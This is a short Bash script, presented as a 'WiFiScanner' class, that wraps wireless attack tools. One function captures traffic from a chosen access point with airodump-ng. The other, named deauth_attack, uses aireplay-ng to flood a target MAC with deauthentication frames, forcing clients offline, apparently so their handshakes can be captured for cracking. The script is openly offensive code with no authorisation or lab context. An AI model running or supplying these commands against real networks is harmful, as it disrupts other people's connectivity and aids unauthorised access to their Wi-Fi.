#!/bin/bash
# WiFiScanner class implementation in Bash
# Note: Actual implementation would include Python wrappers

start_capture() {
    local interface=$1 channel=$2 mac=$3
    sudo airodump-ng -c $channel -d $mac -w capture $interface
}

deauth_attack() {
    local interface=$1 mac=$2
    sudo aireplay-ng -0 10 -a $mac $interface
}
